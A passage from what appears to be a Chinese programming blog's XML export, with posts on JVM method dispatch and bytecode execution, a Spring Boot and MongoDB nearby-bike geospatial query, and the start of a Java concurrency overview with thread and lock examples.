第17和第21两行是方法调用指令，单从字节码的角度来看，这两条调用指令无论是指令(都是invokevirtual)还是参数(都是常量池中Human.sayHello()的符号引用)都完全一样，但是这两条指令最终执行的目标方法并不相同，其原因需要从invokevirutal指令的多态查找过程开始说起，invokevirtual指令的运行时解析过程大致分为以下步骤： a.找到操作数栈顶的第一个元素所指向的对象实际类型，记作C。 b.如果在类型C中找到与常量中描述符和简单名称都相同的方法，则进行访问权限校验，如果通过则返回这个方法的直接引用，查找结束；不通过则返回java.lang.IllegalAccessError错误。 c.否则，按照继承关系从下往上依次对C的各个父类进行第2步的搜索与校验过程。 d.如果始终没有找到合适的方法，则抛出java.lang.AbstractMethodError错误。 由于invokevirtual指令执行的第一步就是在运行期确定接收者的实际类型，所以两次调用中的invokevirtual指令把常量池中的类方法符号引用解析到了不同的直接引用上，这个过程就是Java语言中方法重写的本质。我们把这种在运行期根据实际类型确定方法执行版本的分派过程称为动态分派。 单分派与多分派 方法的接收者与方法的参数统称为方法的宗量。根据分派基于多少种宗量，可以将分派划分为单分派与多分派两种。单分派是根据一个宗量来对目标方法进行选择，多分派则是根据多于一个宗量对目标方法进行选择。在编译期的静态分派过程选择目标方法的依据有两点：一是静态类型；二是方法参数，所以Java语言的静态分派属于多分派类型。在运行阶段虚拟机的动态分派过程只能接收者的实际类型一个宗量作为目标方法选择依据，所以Java语言的动态分派属于单分派类型。所以Java语言是一门静态多分派，动态单分派语言。 2.3 JVM实现动态分派动态分派在Java中被大量使用，使用频率及其高，如果在每次动态分派的过程中都要重新在类的方法元数据中搜索合适的目标的话就可能影响到执行效率，因此JVM在类的方法区中建立虚方法表（virtual method table）来提高性能。每个类中都有一个虚方法表，表中存放着各个方法的实际入口。如果某个方法在子类中没有被重写，那子类的虚方法表中该方法的地址入口和父类该方法的地址入口一样，即子类的方法入口指向父类的方法入口。如果子类重写父类的方法，那么子类的虚方法表中该方法的实际入口将会被替换为指向子类实现版本的入口地址。那么虚方法表什么时候被创建？虚方法表会在类加载的连接阶段被创建并开始初始化，类的变量初始值准备完成之后，JVM会把该类的方法表也初始化完毕。 由于动态分派是非常频繁的动作，而且动态分派的方法版本选择过程需要在运行时在类的方法元数据中搜索合适的目标方法，因此在虚拟机的实际实现中基于性能的考虑，大部分实现都不会真的进行如此频繁的搜索。面对这种情况，最常用的优化手段就是在类的方法区中建立一个虚方法表(Virtual Method Table，也称vtable，与此对应，在invokeinterface执行时也会用到接口方法表，Interface Method Table，也称itable)，使用虚方法表索引来代替元数据据查找以提高性能。 虚方法表中存放着各个方法的实际入口地址。如果某个方法在子类中没有被重写，那么子类的虚方法表里面的地址入口和父类方法的地址入口是一致的，都指向父类的实现入口。如果子类中重写了这个方法，子类方法表中的地址将会被替换为指向子类实现版本的地址入口。 2.4 以例子来说明方法调用过程12345678910111213141516171819package org.louis.jvm.codeset; /** * JVM 原理简单用例 * @author louis * */ public class Bootstrap &#123; public static void main(String[] args) &#123; String name = "Louis"; greeting(name); &#125; public static void greeting(String name) &#123; System.out.println("Hello,"+name); &#125; &#125; 当我们将Bootstrap.java 编译成Bootstrap.class 并运行这段程序的时候，在JVM复杂的运行逻辑中，会有以下几步： 首先JVM会先将这个Bootstrap.class 信息加载到 内存中的方法区(Method Area)中。Bootstrap.class 中包含了常量池信息，方法的定义 以及编译后的方法实现的二进制形式的机器指令，所有的线程共享一个方法区，从中读取方法定义和方法的指令集。 接着，JVM会在Heap堆上为Bootstrap.class 创建一个Class实例用来表示Bootstrap.class 的 类实例。 JVM开始执行main方法，这时会为main方法创建一个栈帧，以表示main方法的整个执行过程（我会在后面章节中详细展开这个过程）； main方法在执行的过程之中，调用了greeting静态方法，则JVM会为greeting方法创建一个栈帧，推到虚拟机栈顶（我会在后面章节中详细展开这个过程）。 当greeting方法运行完成后，则greeting方法出栈，main方法继续运行； JVM方法调用的过程是通过栈帧来实现的，那么，方法的指令是如何运行的呢？弄清楚这个之前，我们要先了解对于JVM而言，方法的结构是什么样的。 我们知道，class 文件是 JVM能够识别的二进制文件，其中通过特定的结构描述了每个方法的定义。 JVM在编译Bootstrap.java 的过程中，在将源代码编译成二进制机器码的同时，会判断其中的每一个方法的三个信息： 1 ). 在运行时会使用到的局部变量的数量（作用是：当JVM为方法创建栈帧的时候，在栈帧中为该方法创建一个局部变量表，来存储方法指令在运算时的局部变量值） 2 ). 其机器指令执行时所需要的最大的操作数栈的大小（当JVM为方法创建栈帧的时候，在栈帧中为方法创建一个操作数栈，保证方法内指令可以完成工作） 3 ). 方法的参数的数量 经过编译之后，我们可以得到main方法和greeting方法的信息如下： 3. 方法的执行3.1 解释执行在jdk 1.0时代，Java虚拟机完全是解释执行的，随着技术的发展，现在主流的虚拟机中大都包含了即时编译器(JIT)。因此，虚拟机在执行代码过程中，到底是解释执行还是编译执行，只有它自己才能准确判断了，但是无论什么虚拟机，其原理基本符合现代经典的编译原理，如下图所示： 在Java中，javac编译器完成了词法分析、语法分析以及抽象语法树的过程，最终遍历语法树生成线性字节码指令流的过程，此过程发生在虚拟机外部。 3.2 基于栈的指令集与基于寄存器的指令集Java编译器输入的指令流基本上是一种基于栈的指令集架构，指令流中的指令大部分是零地址指令，其执行过程依赖于操作栈。 另外一种指令集架构则是基于寄存器的指令集架构，典型的应用是x86的二进制指令集，比如传统的PC以及Android的Davlik虚拟机。 两者之间最直接的区别是，基于栈的指令集架构不需要硬件的支持，而基于寄存器的指令集架构则完全依赖硬件，这意味基于寄存器的指令集架构执行效率更高，单可移植性差，而基于栈的指令集架构的移植性更高，但执行效率相对较慢，初次之外，相同的操作，基于栈的指令集往往需要更多的指令，比如同样执行2+3这种逻辑操作，其指令分别如下： 基于栈的计算流程（以Java虚拟机为例）： 12345678iconst_2 istore_1 iconst_3 istore_2 iload_1 iload_2 iadd istore_0 而基于寄存器的计算流程： 12mov eax,2 //将eax寄存器的值设为1add eax,3 //使eax寄存器的值加3 3.3 基于栈的代码执行示例下面我们用简单的案例来解释一下JVM代码执行的过程，代码实例如下： 12345678910111213public class MainTest &#123; public static int add()&#123; int result=0; int i=2; int j=3; int c=5; return result =(i+j)*c; &#125; public static void main(String[] args) &#123; MainTest.add(); &#125;&#125; 使用javap指令查看字节码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&#123; public MainTest(); flags: ACC_PUBLIC Code: stack=1, locals=1, args_size=1 0: aload_0 1: invokespecial #1 // Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V 4: return LineNumberTable: line 2: 0 public static int add(); flags: ACC_PUBLIC, ACC_STATIC Code: stack=2, locals=4, args_size=0 //栈深度2，局部变量4个，参数0个 0: iconst_0 //对应result=0,0入栈 1: istore_0 //取出栈顶元素0，将其存放在第0个局部变量solt中 2: iconst_2 //对应i=2,2入栈 3: istore_1 //取出栈顶元素2，将其存放在第1个局部变量solt中 4: iconst_3 //对应 j=3，3入栈 5: istore_2 //取出栈顶元素3，将其存放在第2个局部变量solt中 6: iconst_5 //对应c=5，5入栈 7: istore_3 //取出栈顶元素，将其存放在第3个局部变量solt中 8: iload_1 //将局部变量表的第一个slot中的数值2复制到栈顶 9: iload_2 //将局部变量表中的第二个slot中的数值3复制到栈顶 10: iadd //两个栈顶元素2,3出栈，执行相加，将结果5重新入栈 11: iload_3 //将局部变量表中的第三个slot中的数字5复制到栈顶 12: imul //两个栈顶元素出栈5,5出栈，执行相乘，然后入栈 13: dup //复制栈顶元素25，并将复制值压入栈顶. 14: istore_0 //取出栈顶元素25，将其存放在第0个局部变量solt中 15: ireturn //将栈顶元素25返回给它的调用者 LineNumberTable: line 4: 0 line 5: 2 line 6: 4 line 7: 6 line 8: 8 public static void main(java.lang.String[]); flags: ACC_PUBLIC, ACC_STATIC Code: stack=1, locals=1, args_size=1 0: invokestatic #2 // Method add:()I 3: pop 4: return LineNumberTable: line 12: 0 line 13: 4&#125; 3.4 继续以上面个例子来说明方法执行过程3.4.1 为main方法创建栈帧JVM解析main方法，发现其 局部变量的数量为 2，操作数栈的数量为1， 则会为main方法创建一个栈帧（VM Stack），并将其加入虚拟机栈中： 3.4.2 完成栈帧初始化main栈帧创建完成后，会将栈帧push 到虚拟机栈中，现在有两步重要的事情要做： a). 计算PC值。PC 是指令计数器，其内部的值决定了JVM虚拟机下一步应该执行哪一个机器指令，而机器指令存放在方法区，我们需要让PC的值指向方法区的main方法上； 初始化 PC = main方法在方法区指令的地址+0； b). 局部变量的初始化。main方法有个入参(String[] args) ，JVM已经在main所在的栈帧的局部变量表中为其空出来了一个slot ，我们需要将 args 的引用值初始化到局部点亮表中； 接着JVM开始读取PC指向的机器指令。如上图所示，main方法的指令序列：12 10 4c 2b b8 20 12 b1 ，通过JVM虚拟机指令集规范，可以将这个指令序列解析成以下Java汇编语言: 当main方法调用greeting()时， JVM会为greeting方法创建一个栈帧，用以表示对greeting方法的调用，具体栈帧信息如下： 具体的greeting方法的机器码表示的含义如下所示： 总结： 由于JVM的指令是基于栈的，即大部分的指令的执行，都伴随着操作数的出栈和入栈。所以在学习JVM的机器指令的时候，一定要铭记一点： 每个机器指令的执行，对操作数栈和局部变量产生影响。 机器指令的格式 a). 如上图所示JVM虚拟机的操作码是由一个字节组成的，也就是说对于JVM虚拟机而言，其指令的数量最多为 2^8,即 256个; b). 上图中的操作码如:b2,bb,59….等等都是表示某一特定的机器指令，为了方便我们识别，其分别有相应的助记符：getstatic,new,dup…. 这样方便我们理解。 参考： http://blog.csdn.net/dd864140130/article/details/49515403 http://blog.csdn.net/luanlouis/article/details/50412126 注： slot也称为容量槽，虚拟规范中并没有规定一个Slot应该占据多大的内存空间。 ↩ 这里的严格匹配指的是字节码操作的栈中的实际元素类型必须要字节码规定的元素类型一致。比如iadd指令规定操作两个整形数据，那么在操作栈中的实际元素的时候，栈中的两个元素也必须是整形。 ↩ Animal dog=new Dog();其中的Animal我们称之为静态类型，而Dog称之为动态类型。两者都可以发生变化，区别在于静态类型只在使用时发生变化，变量本身的静态类型不会被改变，最终的静态类型是在编译期间可知的，而实际类型则是在运行期才可确定。 ↩ Animal dog=new Dog();其中的Animal我们称之为静态类型，而Dog称之为动态类型。两者都可以发生变化，区别在于静态类型只在使用时发生变化，变量本身的静态类型不会被改变，最终的静态类型是在编译期间可知的，而实际类型则是在运行期才可确定。 ↩ 宗量：方法的接受者与方法的参数称为方法的宗量。举个例子： 123456public void dispatcher()&#123; int result=this.execute(8,9); &#125; public void execute(int pointX,pointY)&#123; //TODO &#125; 在dispatcher()方法中调用了execute(8,9)，那此时的方法接受者为当前this指向的对象，8、9为方法的参数，this对象和参数就是我们所说的宗量。]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十二、整合mongodb获取附近单车以及距离]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%BA%8C%E3%80%81%E6%95%B4%E5%90%88mongodb%E8%8E%B7%E5%8F%96%E9%99%84%E8%BF%91%E5%8D%95%E8%BD%A6%E4%BB%A5%E5%8F%8A%E8%B7%9D%E7%A6%BB%2F</url>
    <content type="text"><![CDATA[整合mongodb获取附近单车以及距离 1、引入依赖：1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-mongodb&lt;/artifactId&gt;&lt;/dependency&gt; 2、yml文件配置：1234567接在spring下： #springdata data: # mongoDB #mongodb note:mongo3.x will not use host and port,only use uri mongodb: uri: mongodb://localhost:27017/bike 3、实体类1234567891011121314151617181920212223242526272829303132//单车的位置集合对应的实体类：@Datapublic class BikeLocation &#123; private String id; private Long bikeNumber; private int status; private Double[] coordinates; private Double distance;&#125;//前台传来的用户位置实体类：@Datapublic class Point &#123; public Point() &#123; &#125; public Point(Double[] loc)&#123; this.longitude = loc[0]; this.latitude = loc[1]; &#125; public Point(double longitude, double latitude) &#123; this.longitude = longitude; this.latitude = latitude; &#125; private double longitude; private double latitude;&#125; 4、给MongoDB一些初始数据：1234567891011121314形如：&#123; &quot;_id&quot; : ObjectId(&quot;59fa81910499f31ad0a5e75d&quot;), &quot;bike_no&quot; : 28000000, &quot;location&quot; : &#123; &quot;type&quot; : &quot;Point&quot;, &quot;coordinates&quot; : [ 118.768376, 32.091533 ] &#125;, &quot;status&quot; : 1&#125; 注意要增加location字段的索引。 123&#123; &quot;location&quot; : &quot;2dsphere&quot;&#125; 根据传来的坐标以及范围进行查询： 1db.getCollection(&apos;bike-position&apos;).find(&#123;location:&#123;$nearSphere:&#123;$geometry:&#123;type:&quot;Point&quot;,coordinates:[118.768376,32.091533]&#125;,$maxDistance:5000&#125;&#125;,status:1&#125;) 5、BikeGeoService 程序化上面的查询无距离的查询 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758@Autowiredprivate MongoTemplate mongoTemplate;/** * @param collection 指定查询的集合 * @param locationField 查询的字段 * @param center 上传上来的坐标 * @param minDistance 最小的距离 * @param maxDistance 最大的距离 * @param query 查询的条件 * @param fields 限制查询出来的字段 * @param limit 限制查询出来的个数 * @Description 查找某经坐标点附近某范围内坐标点 由近到远 无距离 */public List&lt;BikeLocation&gt; geoNearSphere(String collection, String locationField, Point center, long minDistance, long maxDistance, DBObject query, DBObject fields, int limit) throws BikeException &#123; try &#123; //先new出来用来存放查询条件 if (query == null) &#123; query = new BasicDBObject(); &#125; //locationField就是location，与上面的查询时一致的 query.put(locationField, new BasicDBObject("$nearSphere", new BasicDBObject("$geometry", new BasicDBObject("type", "Point") .append("coordinates", new double[]&#123;center.getLongitude(), center.getLatitude()&#125;)) .append("$minDistance", minDistance) .append("$maxDistance", maxDistance) )); query.put("status", 1); //查询结果的集合 List&lt;DBObject&gt; objList = mongoTemplate.getCollection(collection).find(query, fields).limit(limit).toArray(); //用List存放到对应的对象中 List&lt;BikeLocation&gt; result = new ArrayList&lt;&gt;(); for (DBObject obj : objList) &#123; BikeLocation location = new BikeLocation(); //Integer转到Long location.setBikeNumber(((Integer) obj.get("bike_no")).longValue()); location.setStatus((Integer) obj.get("status")); BasicDBList coordinates = (BasicDBList) ((BasicDBObject) obj.get("location")).get("coordinates"); Double[] temp = new Double[2]; coordinates.toArray(temp); location.setCoordinates(temp); result.add(location); &#125; return result; &#125; catch (Exception e) &#123; log.error("fail to find around bike", e); throw new BikeException("查找附近单车失败"); &#125;&#125; 可以用单元测试对这个service进行测试一下： 12345678@Testpublic void contextLoads() throws BikeException &#123; List&lt;BikeLocation&gt; lists = bikeGeoService.geoNearSphere("bike-position","location", new Point(118.768376, 32.091533),0,5000,null,null,10); for (BikeLocation list:lists)&#123; System.out.println("======"+list); &#125;&#125; 结果： 12======BikeLocation(id=null, bikeNumber=28000003, status=1, coordinates=[118.768376, 32.091533], distance=null)======BikeLocation(id=null, bikeNumber=28000001, status=1, coordinates=[118.772041, 32.093812], distance=null) 有距离的查询： 1234567891011121314151617181920212223242526272829303132333435363738394041424344/** * @param collection 指定查询的集合 * @param query 查询的条件 * @param point 用户上传的坐标 * @param limit 限制查询出来的个数 * @param maxDistance 最大的距离 * @Description 查找某经坐标点附近某范围内坐标点 由近到远 有距离 */public List&lt;BikeLocation&gt; geoNear(String collection, DBObject query, Point point, int limit, long maxDistance) throws BikeException &#123; try &#123; if (query == null) &#123; query = new BasicDBObject(); &#125; List&lt;DBObject&gt; pipeLine = new ArrayList&lt;&gt;(); BasicDBObject aggregate = new BasicDBObject("$geoNear", new BasicDBObject("near", new BasicDBObject("type", "Point").append("coordinates", new double[]&#123;point.getLongitude(), point.getLatitude()&#125;)) .append("distanceField", "distance") .append("query", new BasicDBObject()) .append("num", limit) .append("maxDistance", maxDistance) .append("spherical", true) .append("query", new BasicDBObject("status", 1)) ); pipeLine.add(aggregate); Cursor cursor = mongoTemplate.getCollection(collection).aggregate(pipeLine, AggregationOptions.builder().build()); List&lt;BikeLocation&gt; result = new ArrayList&lt;&gt;(); while (cursor.hasNext()) &#123; DBObject obj = cursor.next(); BikeLocation location = new BikeLocation(); location.setBikeNumber(((Integer) obj.get("bike_no")).longValue()); BasicDBList coordinates = (BasicDBList) ((BasicDBObject) obj.get("location")).get("coordinates"); Double[] temp = new Double[2]; coordinates.toArray(temp); location.setCoordinates(temp); location.setDistance((Double) obj.get("distance")); result.add(location); &#125; return result; &#125; catch (Exception e) &#123; log.error("fail to find around bike", e); throw new BikeException("查找附近单车失败"); &#125;&#125; 测试 1234567@Testpublic void geoNear() throws BikeException &#123; List&lt;BikeLocation&gt; lists = bikeGeoService.geoNear("bike-position",null,new Point(118.768376, 32.091533),10,5000); for (BikeLocation list:lists)&#123; System.out.println("======"+list); &#125;&#125; 结果： 123======BikeLocation(id=null, bikeNumber=28000003, status=0, coordinates=[118.768376, 32.091533], distance=0.0)======BikeLocation(id=null, bikeNumber=28000001, status=0, coordinates=[118.772041, 32.093812], distance=428.7518840364588)======BikeLocation(id=null, bikeNumber=28000000, status=0, coordinates=[118.776591, 32.087816], distance=878.3346245371454) 6、service层没有问题，下面就是controller了：1234567891011121314151617@RequestMapping(&quot;/findAroundBike&quot;)public ApiResult findAroundBike(@RequestBody Point point )&#123; ApiResult&lt;List&lt;BikeLocation&gt;&gt; resp = new ApiResult&lt;&gt;(); try &#123; List&lt;BikeLocation&gt; bikeList = bikeGeoService.geoNear(&quot;bike-position&quot;,null,point,10,500); resp.setMessage(&quot;查询附近单车成功&quot;); resp.setData(bikeList); &#125;catch (BikeException e)&#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125;catch (Exception e)&#123; log.error(&quot;Fail to update bike info&quot;, e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage(&quot;内部错误&quot;); &#125; return resp;&#125; 对于这个方法可以不需要授权就能查询，也可以经过登陆授权才能查询。这里假设这个方法是需要授权的： 1234567891011&quot;key&quot;:&quot;user-token&quot;,&quot;value&quot;:&quot;c8c22cd86fa1e9c517efb63c4bc20414&quot;&quot;key&quot;:&quot;version&quot;,&quot;value&quot;:&quot;1.0&quot;请求体是Point,即经纬度坐标：&#123; &quot;longitude&quot;:&quot;118.768376&quot;, &quot;latitude&quot;:&quot;32.091533&quot;&#125;请求的方法为：localhost:8888/bike/findAroundBike 这里选择500米之内，有两辆车，从进到远排序，一辆是他自己，所以distance是0： 123456789101112131415161718192021222324&#123; &quot;code&quot;: 200, &quot;data&quot;: [ &#123; &quot;bikeNumber&quot;: 28000003, &quot;coordinates&quot;: [ 118.768376, 32.091533 ], &quot;distance&quot;: 0, &quot;status&quot;: 0 &#125;, &#123; &quot;bikeNumber&quot;: 28000001, &quot;coordinates&quot;: [ 118.772041, 32.093812 ], &quot;distance&quot;: 428.7518840364588, &quot;status&quot;: 0 &#125; ], &quot;message&quot;: &quot;查询附近单车成功&quot;&#125;]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十二、Java并发总览]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E4%BA%8C%E3%80%81Java%E5%B9%B6%E5%8F%91%E6%80%BB%E8%A7%88%2F</url>
    <content type="text"><![CDATA[从今天开始，开始学习java并发编程的基础知识。本篇介绍java并发编程中的几个关键字以及如何使用。 一、线程状态转换 新建（New） 创建后尚未启动。 可运行（Runnable） 可能正在运行，也可能正在等待 CPU 时间片。包含了操作系统线程状态中的 Running 和 Ready。 阻塞（Blocking） 等待获取一个排它锁，如果其线程释放了锁就会结束此状态。 无限期等待（Waiting） 等待其它线程显式地唤醒，否则不会被分配 CPU 时间片。 进入方法 退出方法 没有设置 Timeout 参数的 Object.wait() 方法 Object.notify() / Object.notifyAll() 没有设置 Timeout 参数的 Thread.join() 方法 被调用的线程执行完毕 LockSupport.park() 方法 - 限期等待（Timed Waiting）无需等待其它线程显式地唤醒，在一定时间之后会被系统自动唤醒。 调用 Thread.sleep() 方法使线程进入限期等待状态时，常常用“使一个线程睡眠”进行描述。 调用 Object.wait() 方法使线程进入限期等待或者无限期等待时，常常用“挂起一个线程”进行描述。 睡眠和挂起是用来描述行为，而阻塞和等待用来描述状态。 阻塞和等待的区别在于，阻塞是被动的，它是在等待获取一个排它锁；而等待是主动的，通过调用 Thread.sleep() 和 Object.wait() 等方法进入。 进入方法 退出方法 Thread.sleep() 方法 时间结束 设置了 Timeout 参数的 Object.wait() 方法 时间结束 / Object.notify() / Object.notifyAll() 设置了 Timeout 参数的 Thread.join() 方法 时间结束 / 被调用的线程执行完毕 LockSupport.parkNanos() 方法 - LockSupport.parkUntil() 方法 - 死亡（Terminated）可以是线程结束任务之后自己结束，或者产生了异常而结束。 二、使用线程有三种使用线程的方法： 实现 Runnable 接口； 实现 Callable 接口； 继承 Thread 类。 实现 Runnable 和 Callable 接口的类只能当做一个可以在线程中运行的任务，不是真正意义上的线程，因此最后还需要通过 Thread 来调用。可以说任务是通过线程驱动从而执行的。 实现 Runnable 接口需要实现 run() 方法。 通过 Thread 调用 start() 方法来启动线程。 12345public class MyRunnable implements Runnable &#123; public void run() &#123; // ... &#125;&#125; 12345public static void main(String[] args) &#123; MyRunnable instance = new MyRunnable(); Thread thread = new Thread(instance); thread.start();&#125; 实现 Callable 接口与 Runnable 相比，Callable 可以有返回值，返回值通过 FutureTask 进行封装。 12345public class MyCallable implements Callable&lt;Integer&gt; &#123; public Integer call() &#123; return 123; &#125;&#125; 1234567public static void main(String[] args) throws ExecutionException, InterruptedException &#123; MyCallable mc = new MyCallable(); FutureTask&lt;Integer&gt; ft = new FutureTask&lt;&gt;(mc); Thread thread = new Thread(ft); thread.start(); System.out.println(ft.get());&#125; 继承 Thread 类同样也是需要实现 run() 方法，并且最后也是调用 start() 方法来启动线程。 12345public class MyThread extends Thread &#123; public void run() &#123; // ... &#125;&#125; 1234public static void main(String[] args) &#123; MyThread mt = new MyThread(); mt.start();&#125; 实现接口 VS 继承 Thread实现接口会更好一些，因为： Java 不支持多重继承，因此继承了 Thread 类就无法继承其它类，但是可以实现多个接口； 类可能只要求可执行就行，继承整个 Thread 类开销过大。 三、基础线程机制ExecutorExecutor 管理多个异步任务的执行，而无需程序员显式地管理线程的生命周期。 主要有三种 Executor： CachedThreadPool：一个任务创建一个线程； FixedThreadPool：所有任务只能使用固定大小的线程； SingleThreadExecutor：相当于大小为 1 的 FixedThreadPool。 1234567public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; 5; i++) &#123; executorService.execute(new MyRunnable()); &#125; executorService.shutdown();&#125; Daemon守护线程是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。 当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程。 main() 属于非守护线程。 使用 setDaemon() 方法将一个线程设置为守护线程。 1234public static void main(String[] args) &#123; Thread thread = new Thread(new MyRunnable()); thread.setDaemon(true);&#125; sleep()Thread.sleep(millisec) 方法会休眠当前正在执行的线程，millisec 单位为毫秒。 sleep() 可能会抛出 InterruptedException，因为异常不能跨线程传播回 main() 中，因此必须在本地进行处理。线程中抛出的其它异常也同样需要在本地进行处理。 1234567public void run() &#123; try &#123; Thread.sleep(3000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125;&#125; yield()对静态方法 Thread.yield() 的调用声明了当前线程已经完成了生命周期中最重要的部分，可以切换给其它线程来执行。该方法只是对线程调度器的一个建议，而且也只是建议具有相同优先级的其它线程可以运行。 123public void run() &#123; Thread.yield();&#125; 四、中断一个线程执行完毕之后会自动结束，如果在运行过程中发生异常也会提前结束。 InterruptedException通过调用一个线程的 interrupt() 来中断该线程，如果该线程处于阻塞、限期等待或者无限期等待状态，那么就会抛出 InterruptedException，从而提前结束该线程。但是不能中断 I/O 阻塞和 synchronized 锁阻塞。 对于以下代码，在 main() 中启动一个线程之后再中断它，由于线程中调用了 Thread.sleep() 方法，因此会抛出一个 InterruptedException，从而提前结束线程，不执行之后的语句。 1234567891011121314public class InterruptExample &#123; private static class MyThread1 extends Thread &#123; @Override public void run() &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) throws InterruptedException &#123; Thread thread1 = new MyThread1(); thread1.start(); thread1.interrupt(); System.out.println("Main run");&#125; 123456Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at InterruptExample.lambda$main$0(InterruptExample.java:5) at InterruptExample$$Lambda$1/713338599.run(Unknown Source) at java.lang.Thread.run(Thread.java:745) interrupted()如果一个线程的 run() 方法执行一个无限循环，并且没有执行 sleep() 等会抛出 InterruptedException 的操作，那么调用线程的 interrupt() 方法就无法使线程提前结束。 但是调用 interrupt() 方法会设置线程的中断标记，此时调用 interrupted() 方法会返回 true。因此可以在循环体中使用 interrupted() 方法来判断线程是否处于中断状态，从而提前结束线程。 123456789101112public class InterruptExample &#123; private static class MyThread2 extends Thread &#123; @Override public void run() &#123; while (!interrupted()) &#123; // .. &#125; System.out.println("Thread end"); &#125; &#125;&#125; 12345public static void main(String[] args) throws InterruptedException &#123; Thread thread2 = new MyThread2(); thread2.start(); thread2.interrupt();&#125; 1Thread end Executor 的中断操作调用 Executor 的 shutdown() 方法会等待线程都执行完毕之后再关闭，但是如果调用的是 shutdownNow() 方法，则相当于调用每个线程的 interrupt() 方法。 以下使用 Lambda 创建线程，相当于创建了一个匿名内部线程。 12345678910111213public static void main(String[] args) &#123; ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; &#123; try &#123; Thread.sleep(2000); System.out.println("Thread run"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); executorService.shutdownNow(); System.out.println("Main run");&#125; 12345678Main runjava.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ExecutorInterruptExample.lambda$main$0(ExecutorInterruptExample.java:9) at ExecutorInterruptExample$$Lambda$1/1160460865.run(Unknown Source) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) 如果只想中断 Executor 中的一个线程，可以通过使用 submit() 方法来提交一个线程，它会返回一个 Future&lt;?&gt; 对象，通过调用该对象的 cancel(true) 方法就可以中断线程。 1234Future&lt;?&gt; future = executorService.submit(() -&gt; &#123; // ..&#125;);future.cancel(true); 五、互斥同步Java 提供了两种锁机制来控制多个线程对共享资源的互斥访问，第一个是 JVM 实现的 synchronized，而另一个是 JDK 实现的 ReentrantLock。 synchronized1. 同步一个代码块 12345public void func () &#123; synchronized (this) &#123; // ... &#125;&#125; 它只作用于同一个对象，如果调用两个对象上的同步代码块，就不会进行同步。 对于以下代码，使用 ExecutorService 执行了两个线程（这两个线程使用 Lambda 创建），由于调用的是同一个对象的同步代码块，因此这两个线程会进行同步，当一个线程进入同步语句块时，另一个线程就必须等待。 12345678910public class SynchronizedExample &#123; public void func1() &#123; synchronized (this) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 123456public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e1.func1());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 对于以下代码，两个线程调用了不同对象的同步代码块，因此这两个线程就不需要同步。从输出结果可以看出，两个线程交叉执行。 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func1()); executorService.execute(() -&gt; e2.func1());&#125; 10 0 1 1 2 2 3 3 4 4 5 5 6 6 7 7 8 8 9 9 2. 同步一个方法 123public synchronized void func () &#123; // ...&#125; 它和同步代码块一样，只作用于同一个对象。 3. 同步一个类 12345public void func() &#123; synchronized (SynchronizedExample.class) &#123; // ... &#125;&#125; 作用于整个类，也就是说两个线程调用同一个类的不同对象上的这种同步语句，也需要进行同步。 12345678910public class SynchronizedExample &#123; public void func2() &#123; synchronized (SynchronizedExample.class) &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; &#125;&#125; 1234567public static void main(String[] args) &#123; SynchronizedExample e1 = new SynchronizedExample(); SynchronizedExample e2 = new SynchronizedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; e1.func2()); executorService.execute(() -&gt; e2.func2());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 4. 同步一个静态方法 123public synchronized static void fun() &#123; // ...&#125; 作用于整个类。 ReentrantLock123456789101112131415public class LockExample &#123; private Lock lock = new ReentrantLock(); public void func() &#123; lock.lock(); try &#123; for (int i = 0; i &lt; 10; i++) &#123; System.out.print(i + " "); &#125; &#125; finally &#123; lock.unlock(); // 确保释放锁，从而避免发生死锁。 &#125; &#125;&#125; 123456public static void main(String[] args) &#123; LockExample lockExample = new LockExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; lockExample.func()); executorService.execute(() -&gt; lockExample.func());&#125; 10 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 ReentrantLock 是 java.util.concurrent（J.U.C）包中的锁，相比于 synchronized，它多了以下高级功能： 1. 等待可中断 当持有锁的线程长期不释放锁的时候，正在等待的线程可以选择放弃等待，改为处理其他事情，可中断特性对处理执行时间非常长的同步块很有帮助。 2. 可实现公平锁 